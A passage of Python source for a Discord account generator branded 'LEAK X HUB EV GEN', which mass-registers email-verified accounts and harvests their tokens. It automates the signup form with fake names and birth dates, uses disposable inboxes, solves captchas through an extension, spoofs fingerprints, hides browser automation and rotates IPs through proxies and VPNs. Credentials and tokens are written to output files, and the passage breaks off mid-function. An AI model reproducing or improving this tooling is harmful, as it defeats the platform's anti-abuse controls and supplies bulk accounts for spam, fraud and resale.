async def fetch_discord_token(email: str, password: str, proxy_config: Dict = None) -> str:
    url = "https://discord.com/api/v9/auth/login"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "origin": "https://discord.com",
        "referer": "https://discord.com/channels/@me",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }
    payload = {"login": email, "password": password}
    session = tls_client.Session(client_identifier="chrome_131", random_tls_extension_order=True)
    if proxy_config:
        proxy_dict = get_session_proxy(proxy_config)
        if proxy_dict:
            session.proxies = proxy_dict
    try:
        response = session.post(url, headers=headers, json=payload)
        if response.status_code != 200:
            return ""
        return response.json().get("token", "")
    except:
        return ""

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# JAVASCRIPT UTILITIES
# ============================================================================

JS_UTILS = '''
(() => {
    if (window.utils) return;
    
    function setInput(selector, value) {
        const el = document.querySelector(selector);
        if (el) {
            el.value = value;
            el.dispatchEvent(new Event('input', { bubbles: true }));
            el.dispatchEvent(new Event('change', { bubbles: true }));
        }
    }
    
    function clickAllCheckboxes() {
        const checkboxes = document.querySelectorAll('input[type="checkbox"]');
        let clicked = 0;
        checkboxes.forEach(cb => {
            if (!cb.checked) {
                cb.click();
                cb.checked = true;
                clicked++;
            }
        });
        return { clicked: clicked, total: checkboxes.length };
    }
    
    function clickElement(selector) {
        const el = document.querySelector(selector);
        if (el) el.click();
    }
    
    window.utils = {
        setInput,
        clickAllCheckboxes,
        clickElement,
    };
})();
'''

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# CONFIGURATION
# ============================================================================

LOCK = threading.Lock()
SESSION_TARGET = 0
SESSION_CREATED = 0
SESSION_STOP = False
ACTIVE_WORKERS = 0
WORKER_LOCK = threading.Lock()
START_TIME = time.time()
COOLDOWN_SECONDS = 60

CONFIG_DIR = Path('input')
CONFIG_PATH = CONFIG_DIR / 'config.json'
OUTPUT_DIR = Path('output')
OUTPUT_DIR.mkdir(exist_ok=True)

def load_or_create_config():
    if not CONFIG_PATH.exists():
        CONFIG_DIR.mkdir(exist_ok=True)
        template_config = {
            "threads": 1,
            "cooldown": 91,
            "provider_selection": "crowmail",
            "email_providers": {
                "cybertemp": {
                    "enabled": False,
                    "api_key": "",
                    "description": "CyberTemp - Free temporary email service"
                },
                "duckmail": {
                    "enabled": True,
                    "password": "Chahal@14",
                    "description": "DuckMail - Free temporary email service"
                },
                "hotmail007": {
                    "enabled": False,
                    "client_key": "",
                    "description": "Hotmail007 - Premium Hotmail email accounts"
                },
                "zeusx": {
                    "enabled": False,
                    "api_key": "",
                    "description": "ZeusX - Premium Zeus email accounts"
                },
                "leveragers": {
                    "enabled": False,
                    "api_key": "",
                    "domain": "leveragers.xyz",
                    "description": "Leveragers - Private email accounts"
                },
                "draxono": {
                    "enabled": False,
                    "api_key": "",
                    "domains": ["durudraxon.online"],
                    "description": "Public Temp Inbox - Free temporary email"
                },
                "mailcow": {
                    "enabled": False,
                    "mailcow_url": "",
                    "api_key": "",
                    "imap_host": "",
                    "domains": [],
                    "description": "Mailcow - Self-hosted email server"
                }
            },
            "proxy": {"enabled": False, "file": "input/proxies.txt"},
            "mullvad": {"enabled": False, "country": "us", "auto_login": False, "account_number": "", "account_file": "input/mullvad_accounts.txt"},
            "urbanvpn": {"enabled": False, "server": "us", "path": ""},
            "adb": {"enabled": False, "path": "", "host": "127.0.0.1", "port": 5555},
            "nopecha": {"enabled": False, "api_key": "YOUR_NOPECHA_API_KEY_HERE"}
        }
        with open(CONFIG_PATH, 'w', encoding='utf-8') as f:
            json.dump(template_config, f, indent=4)
        print(f"\n\033[93m[CONFIG]\033[0m Config created at: {CONFIG_PATH}")
        sys.exit(0)
    with open(CONFIG_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)

config = load_or_create_config()
THREAD_COUNT = config.get("threads", 1)
COOLDOWN_SECONDS = config.get("cooldown", 10)

mullvad_config = config.get("mullvad", {})
urbanvpn_config = config.get("urbanvpn", {})
if mullvad_config.get("enabled", False) and urbanvpn_config.get("enabled", False):
    print("\033[91m[ERROR]\033[0m Cannot enable both Mullvad and UrbanVPN at the same time.")
    sys.exit(1)

if mullvad_config.get("enabled", False):
    if check_mullvad_installed():
        MULLVAD_AVAILABLE = True
        THREAD_COUNT = 1
        print(f"\033[92m[INFO]\033[0m Mullvad VPN enabled (country: {mullvad_config.get('country', 'us')})")
    else:
        print("\033[91m[ERROR]\033[0m Mullvad CLI not found! Install Mullvad VPN or disable it in config.")
        sys.exit(1)

adb_config = config.get("adb", {})
if adb_config.get("enabled", False):
    pass

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# LEAK X HUB THEMED LOGGER - RED & YELLOW
# ============================================================================

if sys.platform == 'win32':
    import ctypes
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except Exception:
        pass

BOLD = '\033[1m'
CYAN = '\033[96m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
RED = '\033[91m'
WHITE = '\033[97m'
GRAY = '\033[90m'
PURPLE = '\033[95m'
BLUE = '\033[94m'
RESET = '\033[0m'

# LEAK X HUB theme - Red & Yellow only
LX_RED = [(255, 0, 0), (220, 0, 0), (180, 0, 0), (140, 0, 0), (100, 0, 0)]
LX_YELLOW = [(255, 255, 0), (255, 220, 0), (255, 180, 0), (255, 140, 0), (255, 100, 0)]

class Logger:
    def __init__(self):
        self._lock = threading.Lock()
        self._valid_count = 0
        self._locked_count = 0
        self._valid_index = 0
        self._watermark = " @WATERMARK BY LEAK X HUB | discord.gg/leakx"
    
    def debug(self, message: str):
        pass
    
    def _gradient(self, text: str, colors: list) -> str:
        if not text:
            return text
        n = len(text)
        result = []
        for i, ch in enumerate(text):
            if ch == ' ':
                result.append(' ')
                continue
            t = i / (n - 1) if n > 1 else 0
            pos = t * (len(colors) - 1)
            idx = int(pos)
            frac = pos - idx
            r1, g1, b1 = colors[idx]
            r2, g2, b2 = colors[min(idx + 1, len(colors) - 1)]
            r = int(r1 + (r2 - r1) * frac)
            g = int(g1 + (g2 - g1) * frac)
            b = int(b1 + (b2 - b1) * frac)
            result.append(f'\033[38;2;{r};{g};{b}m{ch}')
        result.append('\033[0m')
        return ''.join(result)
    
    def _time(self) -> str:
        ts = datetime.now().strftime('%H:%M:%S')
        return self._gradient(f'[{ts}]', LX_RED)
    
    def _log(self, tag: str, tag_colors: list, message: str, msg_colors: list):
        ts = self._time()
        tag_grad = self._gradient(f'[{tag}]', tag_colors)
        msg_grad = self._gradient(message, msg_colors)
        wm = self._gradient(self._watermark, LX_YELLOW)
        with self._lock:
            line = f"{ts} {tag_grad} {msg_grad} {wm}"
            print(line)
            sys.stdout.flush()
    
    def success(self, message: str):
        self._log('SUCCESS', LX_YELLOW, message, LX_YELLOW)
    
    def info(self, message: str):
        self._log('INFO', LX_RED, message, LX_RED)
    
    def warning(self, message: str):
        self._log('WARN', LX_YELLOW, message, LX_YELLOW)
    
    def error(self, message: str):
        self._log('ERROR', LX_RED, message, LX_RED)
    
    def gen(self, message: str):
        self._log('GEN', LX_YELLOW, message, LX_YELLOW)
    
    def mail(self, message: str):
        self._log('MAIL', LX_RED, message, LX_RED)
    
    def captcha(self, message: str):
        self._log('CAPTCHA', LX_YELLOW, message, LX_YELLOW)
    
    def verify(self, message: str):
        self._log('VERIFY', LX_YELLOW, message, LX_YELLOW)
    
    def token_status(self, status: str):
        ts = self._time()
        if status == 'VALID':
            self._valid_count += 1
            self._valid_index += 1
            total = self._valid_count + self._locked_count
            valid_percent = (self._valid_count / total * 100) if total > 0 else 100.0
            color = LX_YELLOW
            status_display = f'VALID | #{self._valid_count} | {valid_percent:.1f}%'
        elif status == 'LOCKED':
            self._locked_count += 1
            color = LX_RED
            total = self._valid_count + self._locked_count
            valid_percent = (self._valid_count / total * 100) if total > 0 else 0.0
            status_display = f'LOCKED | #{self._locked_count} | {valid_percent:.1f}%'
        else:
            color = LX_RED
            status_display = 'INVALID'
        
        status_grad = self._gradient(f'[{status_display}]', color)
        wm = self._gradient(self._watermark, LX_YELLOW)
        with self._lock:
            line = f"{ts} {status_grad} {wm}"
            print(line)
            sys.stdout.flush()
    
    def white(self, message: str):
        ts = self._time()
        msg_grad = self._gradient(message, LX_YELLOW)
        wm = self._gradient(self._watermark, LX_YELLOW)
        with self._lock:
            line = f"{ts} {msg_grad} {wm}"
            print(line)
            sys.stdout.flush()
    
    def mask_email(self, email: str) -> str:
        if '@' not in email:
            return email
        username, domain = email.split('@', 1)
        if len(username) <= 4:
            masked_username = username[0] + '****'
        else:
            masked_username = username[:4] + '****'
        return f"{masked_username}@{domain}"

    def mask_token(self, token: str) -> str:
        if len(token) <= 20:
            return token[:10] + '***'
        return token[:15] + '***'

    def mask_ip(self, ip: str) -> str:
        if not ip:
            return ip
        if ':' in ip:
            parts = ip.split(':')
            if len(parts) >= 3:
                masked_middle = ':'.join('****' for _ in parts[1:-1])
                return f"{parts[0]}:{masked_middle}:{parts[-1]}"
            return ':'.join(parts[:1] + ['****'])
        if '.' in ip:
            parts = ip.split('.')
            if len(parts) == 4:
                return f"{parts[0]}.***.***.{parts[3]}"
            if len(parts) == 2:
                return f"{parts[0]}.***"
        return re.sub(r'[0-9]', '*', ip)

    def mask_fingerprint(self, fingerprint: str) -> str:
        if not fingerprint or len(fingerprint) <= 8:
            return '***'
        return fingerprint[:4] + '***' + fingerprint[-4:]
    
    def show_final_stats(self):
        total = self._valid_count + self._locked_count
        valid_percent = (self._valid_count / total * 100) if total > 0 else 0
        
        print()
        print(self._gradient('FINAL STATS', LX_RED))
        print(self._gradient(f'VALID   | #{self._valid_count} | {valid_percent:.1f}%', LX_YELLOW))
        print(self._gradient(f'LOCKED  | #{self._locked_count}', LX_RED))
        print(self._gradient(' @WATERMARK BY LEAK X HUB | discord.gg/leakx', LX_YELLOW))
        print()

log = Logger()

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# CONSOLE UI
# ============================================================================

class ConsoleUI:
    def __init__(self, logger: Logger, refresh: float = 0.5):
        self.logger = logger
        self.refresh = refresh
        self._running = False
        self._thread = None

    def _update_title(self):
        try:
            ac = get_account_stats()
            created = globals().get('SESSION_CREATED', 0)
            locked_str = str(ac.get('locked', 0)) if ac.get('locked', 0) > 0 else '-'
            title = (
                f"LEAK X HUB EV GEN | "
                f"Created {created} | "
                f"Valid {ac.get('valid', 0)} | "
                f"Locked {locked_str} | "
                f"discord.gg/leakx"
            )
            if sys.platform == 'win32':
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetConsoleTitleW(title)
                except Exception:
                    pass
        except Exception:
            pass

    def _run(self):
        self._running = True
        while self._running:
            try:
                self._update_title()
                time.sleep(self.refresh)
            except Exception:
                time.sleep(self.refresh)

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._thread = threading.Thread(target=self._run, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

console_ui = None

# Initialize ADB if enabled
adb_config = config.get("adb", {})
if adb_config.get("enabled", False):
    try:
        if not check_adb_installed():
            log.warning("ADB not found on PATH; disabling ADB IP rotation")
            ADB_ENABLED = False
        else:
            result = {'ok': None, 'err': None}
            def _init_wrapper():
                try:
                    result['ok'] = init_adb()
                except Exception as e:
                    result['ok'] = False
                    result['err'] = e

            t = threading.Thread(target=_init_wrapper, daemon=True)
            t.start()
            t.join(20)
            if t.is_alive():
                log.warning("ADB init timed out; disabling ADB IP rotation")
                ADB_ENABLED = False
            else:
                if result.get('ok'):
                    log.success("ADB IP rotation enabled")
                else:
                    log.warning("ADB not available - continuing without ADB IP rotation")
    except Exception as e:
        ADB_ENABLED = False
        log.warning(f"ADB init error, disabling ADB: {e}")

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def generate_password(length: int = 16) -> str:
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password

def generate_form_password(min_length: int = 8) -> str:
    length = max(min_length, 8)
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = random.choice(string.ascii_uppercase) + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + random.choice(string.digits)
    return password

def check_token(token: str, proxy_config: Dict = None) -> str:
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discordapp.com/api/v9/users/@me/library', headers=headers)
        if response.status_code == 200:
            return 'VALID'
        elif response.status_code == 403:
            return 'LOCKED'
        elif response.status_code == 401:
            return 'INVALID'
        else:
            return 'INVALID'
    except:
        return 'ERROR'

def save_account_to_file(email: str, password: str, token: str, status: str):
    try:
        if status == 'VALID':
            output_file = OUTPUT_DIR / "valid.txt"
        elif status == 'LOCKED':
            output_file = OUTPUT_DIR / "locked.txt"
        else:
            output_file = OUTPUT_DIR / "invalid.txt"
        with LOCK:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{token}\n")
        
        with ACCOUNT_STATS_LOCK:
            if status == 'VALID':
                ACCOUNT_STATS['valid'] += 1
            elif status == 'LOCKED':
                ACCOUNT_STATS['locked'] += 1
            elif status == 'INVALID':
                ACCOUNT_STATS['invalid'] += 1
    except Exception as e:
        log.error(f"Save failed: {e}")

def check_email_verified_api(token: str, proxy_config: Dict = None):
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = get_session_proxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return response.json().get('verified', False), response.json().get('email', 'N/A')
        return None, None
    except:
        return None, None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# MAIN EMAIL PROVIDER SELECTOR - ALL PROVIDERS
# ============================================================================

def get_email_from_provider(config: dict) -> tuple:
    provider_selection = config.get("provider_selection", "").lower().strip()
    
    providers = {
        "cybertemp": get_cybertemp_email,
        "duckmail": get_duckmail_email,
        "hotmail007": get_hotmail007_email,
        "zeusx": get_zeusx_email,
        "leveragers": get_leveragers_email,
        "draxono": get_public_temp_inbox_email,
        "mailcow": get_mailcow_email,
    }
    
    if provider_selection in providers:
        email, password, token, uuid = providers[provider_selection](config)
        if email:
            return email, password, token, uuid, provider_selection
        else:
            log.error(f"Failed to get email from {provider_selection}")
            return None, None, None, None, None
    
    for name, func in providers.items():
        provider_config = config.get("email_providers", {}).get(name, {})
        if provider_config.get("enabled", False):
            email, password, token, uuid = func(config)
            if email:
                return email, password, token, uuid, name
    
    log.error("No email providers enabled or all providers failed!")
    return None, None, None, None, None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# DOB FUNCTION
# ============================================================================

async def fill_date_of_birth(page):
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1998,2004))
    
    try:
        result = await page.evaluate(f'''
        (async () => {{
            async function setDobField(label, value) {{
                const el = document.querySelector(`div[aria-label="${{label}}"]`);
                if (!el) return false;
                el.click();
                await new Promise(r => setTimeout(r, 100));
                
                for (let i = 0; i < value.length; i++) {{
                    const char = value[i];
                    document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                        key: char,
                        code: isNaN(char) ? 'Key' + char.toUpperCase() : 'Digit' + char,
                        keyCode: char.toUpperCase().charCodeAt(0),
                        bubbles: true
                    }}));
                    await new Promise(r => setTimeout(r, 50));
                }}
                
                await new Promise(r => setTimeout(r, 100));
                
                document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                    key: 'Enter',
                    code: 'Enter',
                    keyCode: 13,
                    bubbles: true
                }}));
                
                await new Promise(r => setTimeout(r, 100));
                return true;
            }}

            const m = await setDobField("Month", "{month}");
            if (!m) return {{ success: false, error: "Month field not found" }};
            
            const d = await setDobField("Day", "{day}");
            if (!d) return {{ success: false, error: "Day field not found" }};
            
            const y = await setDobField("Year", "{year}");
            if (!y) return {{ success: false, error: "Year field not found" }};
            
            document.body.click();
            await new Promise(r => setTimeout(r, 150));
            
            const buttons = document.querySelectorAll('button');
            for (const btn of buttons) {{
                const text = btn.textContent || '';
                if (text.includes('Continue') || text.includes('Create') || text.includes('Submit') || text.includes('Register')) {{
                    btn.click();
                    break;
                }}
            }}
            
            return {{ success: true }};
        }})()
        ''')

        if result and isinstance(result, dict) and result.get('success'):
            log.success(f"DOB: {month} {day}, {year}")
    except Exception as e:
        pass

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# REGISTRATION FORM FILLING
# ============================================================================

async def fill_registration_form(page, email: str, display_name: str, username: str, password: str) -> bool:
    try:
        email_element = await page.wait_for('input[name="email"]', timeout=10000)
        await email_element.send_keys(email)
        await asyncio.sleep(0.1)
        
        display_element = await page.wait_for('input[name="global_name"]', timeout=5000)
        await display_element.send_keys(display_name)
        await asyncio.sleep(0.1)
        
        username_element = await page.wait_for('input[name="username"]', timeout=5000)
        await username_element.send_keys(username)
        await asyncio.sleep(0.1)
        
        password_element = None
        selectors = [
            'input[aria-label="Password"]',
            'input[name="password"]',
            'input[type="password"]'
        ]
        
        for selector in selectors:
            try:
                password_element = await page.query_selector(selector)
                if password_element:
                    break
            except:
                continue
        
        if password_element:
            await password_element.send_keys(password)
            await asyncio.sleep(0.2)
        
        await asyncio.sleep(0.2)
        await fill_date_of_birth(page)
        await asyncio.sleep(0.1)
        
        try:
            await page.evaluate(JS_UTILS)
            await asyncio.sleep(0.1)
            result = await page.evaluate('window.utils.clickAllCheckboxes()')
            if result and result.get('clicked', 0) > 0:
                log.success(f"Clicked {result.get('clicked')} checkbox(es)")
        except Exception as e:
            pass
        
        clicked = False
        await asyncio.sleep(0.3)
        
        try:
            buttons = await page.query_selector_all('button')
            for button in buttons:
                try:
                    text = await button.get('textContent') or ""
                    if text and any(keyword in text for keyword in ['Continue', 'Create', 'Submit', 'Register']):
                        await button.click()
                        clicked = True
                        break
                except:
                    continue
        except:
            pass
        
        if not clicked:
            try:
                submit = await page.query_selector('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
            except:
                pass
        
        if not clicked:
            try:
                clicked = await page.evaluate('''() => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = btn.textContent || '';
                        if (text.includes('Continue') || text.includes('Create') || text.includes('Submit')) {
                            btn.click();
                            return true;
                        }
                    }
                    return false;
                }''')
            except:
                pass
        
        return True
        
    except Exception as e:
        log.error(f"Form fill error: {e}")
        return False

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# WAIT FOR ACCOUNT CREATION
# ============================================================================

async def wait_for_account_creation(page, timeout: int = 300) -> bool:
    start_time = time.time()
    last_url = ""

    while (time.time() - start_time) < timeout:
        await asyncio.sleep(0.5)

        try:
            try:
                current_url = await page.evaluate('window.location.href')
                if hasattr(current_url, 'value'):
                    current_url = current_url.value or ""
                elif isinstance(current_url, tuple):
                    current_url = str(current_url[0]) if current_url[0] else ""
                else:
                    current_url = str(current_url) if current_url else ""
            except Exception:
                current_url = ""

            if current_url and current_url != last_url:
                last_url = current_url

            if not current_url:
                continue

            skip = ['discord.com/register', 'discord.com/login', 'about:blank', 'chrome://']
            if 'discord.com' in current_url and not any(s in current_url for s in skip):
                log.captcha("Captcha solved, proceeding...")
                return True

        except Exception as e:
            pass

    log.error("Timeout waiting for account creation")
    return False

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# TOKEN EXTRACTION
# ============================================================================

async def wait_for_discord_token(page, timeout: int = 30, email: str = None, password: str = None, proxy_config: Dict = None):
    if not email or not password:
        log.error("Email and password required")
        return None
    
    await asyncio.sleep(3)
    
    attempts = 0
    max_attempts = 5
    
    while attempts < max_attempts:
        attempts += 1
        try:
            token = await fetch_discord_token(email, password, proxy_config)
            if token:
                return token
        except Exception as e:
            pass
        await asyncio.sleep(3)
    
    log.error("Could not fetch token")
    return None

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# SHOW BALANCE AND STOCK
# ============================================================================

def show_balance_and_stock():
    enabled_providers = []
    for name, provider in config.get("email_providers", {}).items():
        if provider.get("enabled", False):
            enabled_providers.append(name)
    
    if not enabled_providers:
        log.error("No email providers enabled in config!")
        return
    
    log.success(f"Enabled providers: {', '.join(enabled_providers)}")

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# LEAK X HUB BANNER - RED & YELLOW
# ============================================================================

def show_banner(ip: str = None, threads: int = None):
    os.system('cls' if os.name == 'nt' else 'clear')
    
    def _gradient_text(text: str, color_list) -> str:
        n = len(text)
        result = []
        for i, ch in enumerate(text):
            if ch == ' ':
                result.append(' ')
                continue
            t = i / (n - 1) if n > 1 else 0
            pos = t * (len(color_list) - 1)
            idx = int(pos)
            frac = pos - idx
            r1, g1, b1 = color_list[idx]
            r2, g2, b2 = color_list[min(idx + 1, len(color_list) - 1)]
            r = int(r1 + (r2 - r1) * frac)
            g = int(g1 + (g2 - g1) * frac)
            b = int(b1 + (b2 - b1) * frac)
            result.append(f'\033[38;2;{r};{g};{b}m{ch}')
        result.append('\033[0m')
        return ''.join(result)
    
    # LEAK X HUB 
    lx_art = """
##        ########     ###     ##    ##           ##     ## 
##        ##          ## ##    ##   ##             ##   ##  
##        ##         ##   ##   ##  ##               ## ##   
##        ######    ##     ##  #####                 ###    
##        ##        #########  ##  ##               ## ##   
##        ##        ##     ##  ##   ##             ##   ##  
########  ########  ##     ##  ##    ##           ##     ## 
    """
    
    print()
    print(_gradient_text(lx_art, LX_RED))
    print()
    print(_gradient_text('LEAK X HUB EV GENERATOR', LX_YELLOW))
    print()
    print(_gradient_text('~ v1 edition~', LX_RED))
    print()
    stats_colors = LX_YELLOW
    ip_display = log.mask_ip(ip) if ip else "N/A"
    print(_gradient_text(f'Threads: {threads or 1}  |  IP: {ip_display}  |  discord.gg/leakx', stats_colors))
    print()
    print(_gradient_text('========================================', LX_RED))
    print()
    print(_gradient_text(' @WATERMARK BY LEAK X HUB', LX_YELLOW))
    print()

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# BATCH COOLDOWN - SILENT
# ============================================================================

async def batch_cooldown(batch_size: int, accounts_created: int):
    if accounts_created == 0:
        return
    for remaining in range(COOLDOWN_SECONDS, 0, -1):
        await asyncio.sleep(1)

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# WORKER FUNCTION - COMPLETE WITH PROXY FIX AND TIMEOUTS
# ============================================================================

async def worker(worker_id: int, proxy_config: Dict = None, fingerprint: str = None):
    global SESSION_CREATED, SESSION_STOP, ACTIVE_WORKERS

    if SESSION_STOP:
        if fingerprint:
            release_fingerprint(fingerprint)
        return

    with WORKER_LOCK:
        ACTIVE_WORKERS += 1

    browser = None
    temp_profile = None
    fingerprint_removed = False
    current_fingerprint = None

    try:
        if MULLVAD_AVAILABLE:
            if config.get("mullvad", {}).get("auto_login", False):
                if not mullvad_auto_login_recent_account():
                    log.error("Mullvad auto-login aborted")
                    return
            country = config.get("mullvad", {}).get("country", "us")
            if not mullvad_rotate(country):
                log.error(f"Mullvad rotate failed, skipping")
                return
        elif URBANVPN_AVAILABLE:
            country = config.get("urbanvpn", {}).get("server", "us")
            if not urbanvpn_rotate(country):
                log.error(f"UrbanVPN rotate failed, skipping")
                return

        # Generate user details
        first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Sam', 'Blake', 'Drew', 'Avery']
        surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis']
        
        first_name = random.choice(first_names).lower()
        last_name = random.choice(surnames).lower()
        display_name = first_name.capitalize() + ' ' + last_name.capitalize()
        
        username_suffixes = ['goturback', 'alltakes', 'isdones', 'nowakex', 'makeite', 'bestmes']
        discord_username = f"{first_name}{random.choice(username_suffixes)}{random.randint(0, 1500)}"
        
        # Get email from enabled provider
        email, email_password, email_token, email_uuid, email_provider = get_email_from_provider(config)
        if not email:
            log.error("No enabled email provider available!")
            return
        
        account_password = email_password
        
        log.mail(f"Generated: {log.mask_email(email)}")
        
        temp_profile = tempfile.mkdtemp()
        browser_args = [
            f'--user-data-dir={temp_profile}',
            '--disable-backgrounding-occluded-windows',
            '--disable-background-timer-throttling',
            '--disable-renderer-backgrounding',
            '--disable-throttling',
            '--no-first-run',
            '--disable-default-apps',
            '--disable-features=IsolateOrigins,site-per-process,ChromeWhatsNewUI',
            '--disable-dev-shm-usage',
            '--disable-breakpad',
            '--disable-component-extensions-with-background-pages',
            '--disable-features=TranslateUI,MediaRouter,OptimizationHints',
            '--disable-domain-reliability',
            '--window-size=400,500',
            '--window-position=0,0',
            '--force-device-scale-factor=1',
            '--disable-blink-features=AutomationControlled',
        ]
        
        # Add proxy if configured
        if proxy_config and proxy_config.get('full_url'):
            proxy_url = proxy_config.get('full_url')
            browser_args.append(f'--proxy-server={proxy_url}')
            browser_args.append('--proxy-bypass-list=<-loopback>')
            log.info(f"Using proxy: {proxy_config.get('masked_url', proxy_url)}")
        
        if NOPECHA_EXT_DIR.exists():
            browser_args.append(f'--load-extension={NOPECHA_EXT_DIR}')
        
        current_key = get_current_nopecha_key()
        if current_key:
            inject_nopecha_key(current_key)
        
        current_fingerprint = fingerprint
        if current_fingerprint:
            fp_value = get_fingerprint_value(current_fingerprint)
            log.info(f"Fingerprint: {log.mask_fingerprint(fp_value or current_fingerprint)}")
        
        # Start browser with timeout
        try:
            browser = await asyncio.wait_for(
                uc.start(
                    headless=False,
                    browser_executable_path=BRAVE_PATH if BRAVE_PATH else None,
                    browser_args=browser_args,
                ),
                timeout=45
            )
        except asyncio.TimeoutError:
            log.error("Browser start timeout - proxy too slow")
            return
        
        # Wait a moment for browser to be ready
        await asyncio.sleep(1)
        
        # Get the page with timeout
        try:
            page = await asyncio.wait_for(
                browser.get("https://discord.com/register"),
                timeout=30
            )
        except asyncio.TimeoutError:
            log.error("Page load timeout - proxy too slow")
            await browser.stop()
            return
            
        if not page:
            log.error("Could not get page")
            return

        if current_fingerprint:
            await inject_fingerprint_to_page(page, current_fingerprint)

        # Wait for page to load with shorter timeout
        page_loaded = False
        for _ in range(15):
            try:
                if await page.query_selector('input[name="email"]'):
                    page_loaded = True
                    break
            except:
                pass
            await asyncio.sleep(0.5)
        
        if not page_loaded:
            log.error("Page didn't load properly - proxy may be slow")
            await browser.stop()
            return
        
        await asyncio.sleep(0.5)
        
        success = await fill_registration_form(page, email, display_name, discord_username, account_password)
        if not success:
            log.error("Form fill failed")
            return
        
        created = await wait_for_account_creation(page)
        if not created:
            log.error("Creation failed")
            return

        token = await wait_for_discord_token(page, email=email, password=account_password, proxy_config=proxy_config)
        
        if token:
            if token.startswith('"') and token.endswith('"'):
                token = token[1:-1]

            token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
            if token_match:
                token = f"{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}"
            
            log.gen(f"Account created! Token: {log.mask_token(token)}")
            
            # Verify email based on provider
            verified = False
            if email_provider == "crowmail":
                verified = await verify_email_crowmail(email, account_password, token, browser, email_token, email_uuid)
            elif email_provider == "cybertemp":
                api = CyberTempAPI(api_key=config.get("email_providers", {}).get("cybertemp", {}).get("api_key", ""))
                verify_url = api.get_verify_url(email, account_password, email_token, email_uuid)
                if verify_url:
                    verified = await verify_email_with_url(browser, verify_url, token)
            elif email_provider == "duckmail":
                api = DuckMailAPI(password=account_password)
                verify_url = api.get_verify_url(email, account_password, email_token, email_uuid)
                if verify_url:
                    verified = await verify_email_with_url(browser, verify_url, token)
            elif email_provider == "hotmail007":
                api = Hotmail007API(config.get("email_providers", {}).get("hotmail007", {}).get("client_key", ""))
                mail_data = api.get_latest_mail(email, account_password, email_token, email_uuid)
                if mail_data:
                    verify_url = None
                    body = mail_data.get('body', '') or mail_data.get('html', '') or ''
                    verify_match = re.search(r'https://discord\.com/verify\?token=[^"\'\>\s]+', body)
                    if verify_match:
                        verify_url = verify_match.group(0)
                    if verify_url:
                        verified = await verify_email_with_url(browser, verify_url, token)
            elif email_provider == "zeusx":
                api = ZeusXAPI(config.get("email_providers", {}).get("zeusx", {}).get("api_key", ""))
                verified = False
            elif email_provider == "leveragers":
                api = MailAPI(api_key=config.get("email_providers", {}).get("leveragers", {}).get("api_key", ""))
                verified = False
            elif email_provider == "draxono":
                api = PublicTempInboxAPI(api_key=config.get("email_providers", {}).get("draxono", {}).get("api_key", ""))
                verified = False
            elif email_provider == "mailcow":
                mc_config = config.get("email_providers", {}).get("mailcow", {})
                api = MailcowAPI(mc_config.get("mailcow_url", ""), mc_config.get("api_key", ""), mc_config.get("imap_host", ""), mc_config.get("domains", []))
                verify_url = api.read_inbox_imap(email, account_password)
                if verify_url:
                    verified = await verify_email_with_url(browser, verify_url, token)
            
            if verified:
                log.verify("Email verified successfully!")
                with ACCOUNT_STATS_LOCK:
                    ACCOUNT_STATS['verified'] += 1
                    ACCOUNT_STATS['captcha_ok'] += 1
            else:
